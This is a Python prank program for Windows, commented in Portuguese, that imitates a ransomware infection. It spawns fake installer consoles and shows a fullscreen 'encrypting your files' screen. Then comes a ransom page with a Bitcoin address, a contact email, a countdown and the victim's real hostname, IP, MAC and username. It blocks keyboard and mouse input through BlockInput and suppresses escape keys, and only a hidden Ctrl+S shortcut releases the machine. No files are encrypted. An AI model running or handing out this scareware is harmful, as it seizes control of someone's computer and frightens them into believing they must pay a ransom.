import os
import time
import random
import subprocess
import tkinter as tk
import threading
import socket
import uuid
import platform
import ctypes
from tkinter import messagebox
from ctypes import wintypes
import webbrowser
from PIL import Image, ImageTk

# Lista para armazenar os processos do CMD
cmd_processes = []

# Configurações de bloqueio de teclas
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

# Constantes
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_CONTROL = 0x11
VK_S = 0x53
VK_ESCAPE = 0x1B
VK_TAB = 0x09
VK_DELETE = 0x2E
VK_MENU = 0x12  # ALT key

# Variáveis globais
ctrl_pressed = False
s_pressed = False
root = None
email_window = None
running = True  # Flag para controle de threads

def safe_destroy(window):
    """Destroi uma janela de forma segura, verificando sua existência"""
    if window and window.winfo_exists():
        try:
            window.destroy()
        except:
            pass
    return None

def block_input():
    """Bloqueia todas as entradas do teclado e mouse"""
    user32.BlockInput(True)

def unblock_input():
    """Desbloqueia todas as entradas do teclado e mouse"""
    user32.BlockInput(False)

def install_keyboard_block():
    """Instala um bloqueio temporário de teclas"""
    threading.Thread(target=keyboard_block_loop, daemon=True).start()

def keyboard_block_loop():
    global ctrl_pressed, s_pressed, running
    
    while running:
        # Teclas bloqueadas (incluindo ALT e F4)
        blocked_keys = [
            VK_LWIN, VK_RWIN,        # Teclas Windows
            VK_ESCAPE, VK_TAB,       # Esc e Tab
            VK_DELETE,               # Delete
            0x73, 0x74, 0x75,        # F4, F5, F6
            0x25, 0x26, 0x27, 0x28,  # Setas
            0x0D,                    # Enter
            0x1B,                    # Esc
            VK_MENU,                 # ALT key (adicione esta linha)
        ]
        
        for key in blocked_keys:
            if user32.GetAsyncKeyState(key) & 0x8000:
                # Libera teclas ALT primeiro para combinações
                if key == 0x73:  # F4
                    user32.keybd_event(VK_MENU, 0, 0x0002, 0)  # Libera ALT
                    time.sleep(0.01)
                user32.keybd_event(key, 0, 0x0002, 0)  # KEYUP
        
        # Monitora Ctrl e S
        ctrl_pressed = user32.GetAsyncKeyState(VK_CONTROL) & 0x8000
        s_pressed = user32.GetAsyncKeyState(VK_S) & 0x8000
        
        # Verifica se Ctrl+S está pressionado para sair
        if ctrl_pressed and s_pressed:
            # Verifica se a janela principal ainda existe
            if root and root.winfo_exists():
                try:
                    # Dá um pequeno delay para garantir que a janela tkinter esteja pronta
                    time.sleep(0.1)
                    root.event_generate("<Control-s>")
                    break  # Sai do loop após acionar o fechamento
                except:
                    break
            else:
                break
        
        time.sleep(0.01)

def get_system_info():
    """Obtém informações do sistema para a mensagem de hacker"""
    try:
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
        ip_address = socket.gethostbyname(hostname)
        processor = platform.processor()
        username = os.getlogin()
        
        return {
            "hostname": hostname,
            "mac": mac_address,
            "ip": ip_address,
            "processor": processor,
            "username": username
        }
    except:
        return {
            "hostname": "DESKTOP-HACKED",
            "mac": "00:1A:C2:7B:00:47",
            "ip": "192.168.1.100",
            "processor": "Intel(R) Core(TM) i7-10700K",
            "username": "Vítima"
        }

def simulate_cmd_windows():
    """Simula várias janelas do CMD instalando algo"""
    for i in range(random.randint(3, 8)):
        title = f"INSTALADOR [{i+1}/8]" if i < 7 else "FINALIZANDO"
        
        # Comando para criar janela CMD personalizada
        cmd = [
            'cmd',
            '/c', 
            f'title {title} && '
            f'echo Instalando componente {i+1}... && '
            f'echo [|||||    ] 75%% && '
            f'timeout /t 5 /nobreak >nul && '
            f'echo Instalacao concluida! && '
            f'pause >nul'
        ]
        
        # Inicia o processo e armazena na lista
        p = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
        cmd_processes.append(p)
        time.sleep(0.7)
    
    time.sleep(3)
    show_encryption_progress()

def show_encryption_progress():
    """Mostra uma tela de encriptação com barra de progresso"""
    global root
    
    # Cria a janela de encriptação
    encrypt_win = tk.Tk()
    encrypt_win.attributes('-fullscreen', True)
    encrypt_win.attributes('-topmost', True)
    encrypt_win.configure(bg='#000000')

    # Adicione estas linhas logo após criar a janela:
    encrypt_win.attributes('-fullscreen', True)
    encrypt_win.attributes('-topmost', True)
    encrypt_win.overrideredirect(True)  # Remove bordas e botões
    
    # Configura proteções (novo)
    block_input()
    install_keyboard_block()
    encrypt_win.bind('<Control-s>', close_all)
    
    # Remove a decoração da janela (bordas, título)
    encrypt_win.overrideredirect(True)
    
    # Frame principal
    main_frame = tk.Frame(encrypt_win, bg='#000000')
    main_frame.pack(expand=True)
    
    # Ícone de cadeado
    lock_icon = tk.Label(
        main_frame,
        text="🔒",
        font=("Arial", 72),
        fg="#FF0000",
        bg="#000000"
    )
    lock_icon.pack(pady=(50, 20))
    
    # Título
    title_label = tk.Label(
        main_frame,
        text="ENCRIPTANDO SEUS ARQUIVOS",
        font=("Arial", 28, "bold"),
        fg="#FF0000",
        bg="#000000"
    )
    title_label.pack(pady=(0, 40))
    
    # Barra de progresso
    progress_frame = tk.Frame(main_frame, bg='#000000')
    progress_frame.pack(fill='x', padx=100, pady=20)
    
    progress_bar = tk.Canvas(progress_frame, height=30, bg='#222222', highlightthickness=0)
    progress_bar.pack(fill='x')
    
    # Texto de progresso
    progress_text = tk.Label(
        main_frame,
        text="0% completado",
        font=("Arial", 18),
        fg="#FF5555",
        bg="#000000"
    )
    progress_text.pack(pady=(20, 0))
    
    # Contador de arquivos
    files_label = tk.Label(
        main_frame,
        text="Arquivos encriptados: 0",
        font=("Arial", 14),
        fg="#AAAAAA",
        bg="#000000"
    )
    files_label.pack(pady=(10, 0))

    # Adicione esta função para manter o foco
    def keep_focus():
        if running and encrypt_win.winfo_exists():
            encrypt_win.focus_force()
            encrypt_win.after(500, keep_focus)
    keep_focus()
    
    # Atualiza a barra de progresso
    def update_progress(percent=0):
        # Atualiza barra
        progress_bar.delete("progress")
        progress_bar.create_rectangle(
            0, 0, percent * progress_bar.winfo_width() / 100, 30,
            fill="#FF0000", outline="", tags="progress"
        )
        
        # Atualiza texto
        progress_text.config(text=f"{percent}% completado")
        files_label.config(text=f"Arquivos encriptados: {percent * 350}")
        
        if percent < 100:
            encrypt_win.after(100, update_progress, percent + 1)
        else:
            encrypt_win.after(1000, lambda: [encrypt_win.destroy(), show_blue_screen()])
    
    # Inicia a animação
    encrypt_win.after(100, update_progress)
    
    encrypt_win.mainloop()

def close_all(event=None):
    """Fecha tudo e restaura o sistema"""
    global email_window, root, running
    
    # Sinaliza para todas as threads pararem
    running = False
    
    unblock_input()
    
    # Fecha todos os processos CMD
    for p in cmd_processes:
        try:
            p.terminate()
        except:
            pass
    
    # Fecha janelas de forma segura
    email_window = safe_destroy(email_window)
    root = safe_destroy(root)
    
    # Mostra a imagem final
    show_final_image()
    
    # Força o encerramento do programa principal
    os._exit(0)

def show_final_image():
    """Mostra a imagem final da pegadinha"""
    img_win = tk.Tk()
    img_win.title("Pegadinha do Malandro!")
    img_win.attributes('-fullscreen', True)
    img_win.configure(bg='black')
    
    # Verifica caminho absoluto da imagem
    script_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(script_dir, "zoador.jpg")
    
    if os.path.exists(image_path):
        try:
            # Carrega a imagem
            img = Image.open(image_path)
            img = img.resize((img_win.winfo_screenwidth(), img_win.winfo_screenheight()), Image.LANCZOS)
            img_tk = ImageTk.PhotoImage(img)
            
            label = tk.Label(img_win, image=img_tk)
            label.image = img_tk  # Mantém referência
            label.pack()
        except Exception as e:
            # Em caso de erro no carregamento
            show_error_fallback(img_win, str(e))
    else:
        # Se a imagem não for encontrada
        show_fallback_image(img_win)
    
    # Botão para sair
    btn_frame = tk.Frame(img_win, bg='black')
    btn_frame.pack(side='bottom', pady=50)
    
    tk.Button(
        btn_frame,
        text="SAIR",
        font=("Arial", 20, "bold"),
        bg="#FF0000",
        fg="white",
        command=img_win.destroy,
        padx=30,
        pady=15
    ).pack()
    
    img_win.mainloop()

def show_fallback_image(window):
    """Mostra mensagem alternativa se a imagem não for encontrada"""
    label = tk.Label(
        window,
        text="PEGADINHA DO MALANDRO!\n\nVocê caiu direitinho! 😂",
        font=("Arial", 48, "bold"),
        fg="white",
        bg="black",
        justify="center"
    )
    label.pack(expand=True)
    
    # Mensagem adicional
    tk.Label(
        window,
        text="(A imagem zoador.jpg não foi encontrada, mas a pegadinha funcionou!)",
        font=("Arial", 18),
        fg="#AAAAAA",
        bg="black"
    ).pack(side='bottom', pady=20)

def show_error_fallback(window, error_msg):
    """Mostra mensagem de erro no carregamento da imagem"""
    label = tk.Label(
        window,
        text="PEGADINHA DO MALANDRO!\n\nVocê caiu direitinho! 😂",
        font=("Arial", 48, "bold"),
        fg="white",
        bg="black",
        justify="center"
    )
    label.pack(expand=True)
    
    # Mensagem de erro
    tk.Label(
        window,
        text=f"(Erro ao carregar imagem: {error_msg})",
        font=("Arial", 14),
        fg="#FF5555",
        bg="black"
    ).pack(side='bottom', pady=10)

def open_email_client():
    """Abre a janela de envio de e-mail"""
    global email_window
    
    email_window = tk.Toplevel(root)
    email_window.title("Enviar Comprovante")
    email_window.geometry("600x500")
    email_window.attributes('-topmost', True)
    email_window.resizable(False, False)
    email_window.grab_set()  # Mantém o foco
    email_window.configure(bg='#2c3e50')
    
    # Frame principal
    main_frame = tk.Frame(email_window, bg='#2c3e50')
    main_frame.pack(padx=20, pady=20, fill='both', expand=True)
    
    # Cabeçalho
    header = tk.Label(
        main_frame,
        text="ENVIAR COMPROVANTE DE PAGAMENTO",
        font=("Arial", 16, "bold"),
        fg="white",
        bg="#2c3e50"
    )
    header.pack(pady=(0, 20))
    
    # Formulário
    form_frame = tk.Frame(main_frame, bg='#34495e', padx=20, pady=20)
    form_frame.pack(fill='both', expand=True)
    
    # Campo: Para
    tk.Label(
        form_frame, 
        text="Para:", 
        font=("Arial", 11), 
        fg="white", 
        bg="#34495e",
        anchor='w'
    ).pack(fill='x', pady=(5, 0))
    
    to_entry = tk.Entry(form_frame, font=("Arial", 11))
    to_entry.insert(0, "darkhacker@protonmail.com")
    to_entry.config(state='disabled')
    to_entry.pack(fill='x', pady=(0, 10))
    
    # Campo: Assunto
    tk.Label(
        form_frame, 
        text="Assunto:", 
        font=("Arial", 11), 
        fg="white", 
        bg="#34495e",
        anchor='w'
    ).pack(fill='x', pady=(5, 0))
    
    subject_entry = tk.Entry(form_frame, font=("Arial", 11))
    subject_entry.insert(0, "Comprovante de Pagamento - ID: D6F7A2-B8C91E-4D3F")
    subject_entry.config(state='disabled')
    subject_entry.pack(fill='x', pady=(0, 10))
    
    # Campo: Mensagem
    tk.Label(
        form_frame, 
        text="Mensagem:", 
        font=("Arial", 11), 
        fg="white", 
        bg="#34495e",
        anchor='w'
    ).pack(fill='x', pady=(5, 0))
    
    message_text = tk.Text(form_frame, height=8, font=("Arial", 11))
    message_text.insert('1.0', "Prezados,\n\nSegue em anexo o comprovante de pagamento do resgate.\n\nPor favor, descriptografem meus arquivos o mais rápido possível.\n\nAtenciosamente,\n")
    message_text.pack(fill='x', pady=(0, 10))
    
    # Campo: Anexo
    attach_frame = tk.Frame(form_frame, bg="#34495e")
    attach_frame.pack(fill='x', pady=(10, 0))
    
    tk.Label(
        attach_frame, 
        text="Anexo:", 
        font=("Arial", 11), 
        fg="white", 
        bg="#34495e",
        anchor='w'
    ).pack(side='left', padx=(0, 10))
    
    attach_btn = tk.Button(
        attach_frame,
        text="Selecionar Arquivo...",
        font=("Arial", 10),
        bg="#3498db",
        fg="white",
        bd=0,
        padx=10,
        pady=5,
        cursor="hand2"
    )
    attach_btn.pack(side='left')
    
    attach_label = tk.Label(
        attach_frame, 
        text="Nenhum arquivo selecionado", 
        font=("Arial", 10), 
        fg="#bdc3c7", 
        bg="#34495e",
        anchor='w'
    )
    attach_label.pack(side='left', padx=(10, 0), fill='x', expand=True)
    
    # Função para selecionar arquivo (simulação)
    def select_file():
        attach_label.config(text="comprovante-pagamento.jpg")
    
    attach_btn.config(command=select_file)
    
    # Botões de ação - CORREÇÃO: Posicionamento melhorado
    btn_frame = tk.Frame(form_frame, bg="#34495e", pady=20)
    btn_frame.pack(fill='x', side='bottom')  # Alterado para bottom
    
    send_btn = tk.Button(
        btn_frame,
        text="Enviar",
        font=("Arial", 12, "bold"),
        bg="#2ecc71",
        fg="white",
        bd=0,
        padx=20,
        pady=10,
        cursor="hand2",
        command=lambda: [
            messagebox.showinfo("Enviado", "Mensagem enviada com sucesso!\nSua chave de descriptografia será enviada em breve."), 
            safe_destroy(email_window)
        ]
    )
    send_btn.pack(side='right', padx=(10, 0))
    
    cancel_btn = tk.Button(
        btn_frame,
        text="Cancelar",
        font=("Arial", 11),
        bg="#e74c3c",
        fg="white",
        bd=0,
        padx=15,
        pady=8,
        cursor="hand2",
        command=lambda: safe_destroy(email_window)
    )
    cancel_btn.pack(side='right')
    
    # Mantém a janela aberta
    email_window.mainloop()

def show_blue_screen():
    """Exibe a tela azul da morte em tela cheia com mensagem de hacker"""
    global root, running
    
    # Preparação do ambiente
    block_input()
    install_keyboard_block()
    
    # Obtém informações do sistema
    system_info = get_system_info()
    
    # Cria a janela principal
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='#0078D7')
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Remove a decoração da janela (bordas, título)
    root.overrideredirect(True)
    
    # Frame principal com divisão esquerda/direita
    main_frame = tk.Frame(root, bg='#0078D7')
    main_frame.pack(fill='both', expand=True, padx=50, pady=30)
    
    # Painel esquerdo (mensagem de resgate)
    left_frame = tk.Frame(main_frame, bg='#0078D7')
    left_frame.pack(side='left', fill='both', expand=True, padx=(0, 20))
    
    # Painel direito (contador centralizado)
    right_frame = tk.Frame(main_frame, bg='#0078D7', width=300)
    right_frame.pack(side='right', fill='both', expand=True, padx=(20, 0))
    
    # Título
    title_label = tk.Label(
        left_frame,
        text="SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!",
        font=("Arial", 24, "bold"),
        fg="white",
        bg="#0078D7"
    )
    title_label.pack(pady=(0, 20), anchor='w')
    
    # Mensagem principal atualizada
    message_text = (
        f"Olá, {system_info['username']}!\n\n"
        "Todos os seus arquivos, fotos e documentos foram criptografados com um algoritmo militar AES-256.\n\n"
        "Para descriptografar seus dados, você precisa pagar um resgate de 0.0935 Bitcoin (BTC).\n\n"
        "Você tem 24 horas para pagar. Após esse prazo, sua chave privada será destruída permanentemente.\n\n"
        "Envie o pagamento para este endereço Bitcoin:\n"
        "bc1qpmy43tdntwhlwp5qce30jcymn4kmrk2fk0dc77\n\n"
        "Após o pagamento, envie seu ID de descriptografia para: darkhacker@protonmail.com\n"
        "Seu ID de descriptografia: {{D6F7A2-B8C91E-4D3F}}\n\n"
    )
    
    message_label = tk.Label(
        left_frame,
        text=message_text,
        font=("Arial", 14),
        fg="white",
        bg="#0078D7",
        justify="left",
        anchor='w',
        wraplength=800
    )
    message_label.pack(pady=(0, 30), anchor='w')
    
    # Informações do sistema
    info_frame = tk.Frame(left_frame, bg='#0050A0', bd=2, relief='sunken')
    info_frame.pack(fill='x', pady=10, anchor='w')
    
    info_text = (
        f"Computador: {system_info['hostname']}\n"
        f"Usuário: {system_info['username']}\n"
        f"Processador: {system_info['processor']}\n"
        f"Endereço IP: {system_info['ip']}\n"
        f"Endereço MAC: {system_info['mac']}\n"
        "Sistema Operacional: Windows 10 Pro (Build 19044.3086)"
    )
    
    info_label = tk.Label(
        info_frame,
        text=info_text,
        font=("Consolas", 12),
        fg="white",
        bg="#0050A0",
        justify="left"
    )
    info_label.pack(padx=20, pady=15)
    
    # Painel direito - Contador regressivo (centralizado)
    countdown_frame = tk.Frame(right_frame, bg='#004080', bd=2, relief='raised', padx=40, pady=40)
    countdown_frame.pack(expand=True, fill='both')
    
    tk.Label(
        countdown_frame,
        text="TEMPO RESTANTE PARA PAGAMENTO",
        font=("Arial", 13, "bold"),
        fg="white",
        bg="#004080"
    ).pack(pady=(0, 20))
    
    countdown_label = tk.Label(
        countdown_frame,
        text="23:59:58",
        font=("Arial", 36, "bold"),
        fg="#FF5555",
        bg="#004080"
    )
    countdown_label.pack(pady=20)
    
    tk.Label(
        countdown_frame,
        text="Horas   Minutos   Segundos",
        font=("Arial", 10),
        fg="#AAAAFF",
        bg="#004080"
    ).pack()
    
    # Valor do resgate
    tk.Label(
        countdown_frame,
        text="RESGATE: 0.0935 BTC",
        font=("Arial", 14, "bold"),
        fg="#FFCC00",
        bg="#004080",
        pady=20
    ).pack()
    
    # Valor aproximado em USD
    tk.Label(
        countdown_frame,
        text="(~ $2,500 USD)",
        font=("Arial", 12),
        fg="#FFCC00",
        bg="#004080"
    ).pack()
    
    # Atualiza o contador regressivo
    def update_countdown(hours=23, minutes=59, seconds=58):
        if seconds < 0:
            minutes -= 1
            seconds = 59
        if minutes < 0 and hours > 0:
            hours -= 1
            minutes = 59
        
        if hours <= 0 and minutes <= 0 and seconds <= 0:
            countdown_label.config(text="TEMPO ESGOTADO!")
            countdown_label.config(fg="#FF0000")
            # Adicionar efeito visual de tempo esgotado
            countdown_frame.config(bg="#8B0000")
            return
        
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        countdown_label.config(text=time_str)
        
        # Mudar cor quando faltar pouco tempo
        if hours < 1:
            countdown_label.config(fg="#FF0000")
            countdown_frame.config(bg="#8B0000")
        
        # Atualiza a cada segundo
        if running:  # Verifica se ainda deve continuar
            root.after(1000, update_countdown, hours, minutes, seconds - 1)
    
    update_countdown()
    
    # Rodapé com mensagem de aviso
    footer_frame = tk.Frame(root, bg='#FFFFFF', padx=20, pady=10)
    footer_frame.pack(side='bottom', fill='x')
    
    warning_label = tk.Label(
        footer_frame,
        text="AVISO: Não reinicie ou desligue o computador. Isso causará a perda permanente dos seus dados. "
             "Seus arquivos só podem ser recuperados com nossa chave privada.",
        font=("Arial", 12),
        fg="#FF0000",
        bg="#FFFFFF",
        justify="center"
    )
    warning_label.pack()
    
    # Configura o atalho Ctrl+S
    root.bind('<Control-s>', close_all)
    
    # Garante que a janela permaneça no topo
    def keep_on_top():
        if running and root.winfo_exists():
            root.attributes('-topmost', True)
            root.after(1000, keep_on_top)
    keep_on_top()
    
    # Traz a janela para frente se perder o foco
    def focus_window():
        if running and root.winfo_exists():
            root.focus_force()
            root.after(500, focus_window)
    focus_window()
    
    root.mainloop()

if __name__ == "__main__":
    # Esconde a janela do console
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    
    # Inicia a simulação em thread separada
    threading.Thread(target=simulate_cmd_windows, daemon=True).start()
    
    # Mantém o programa principal rodando
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
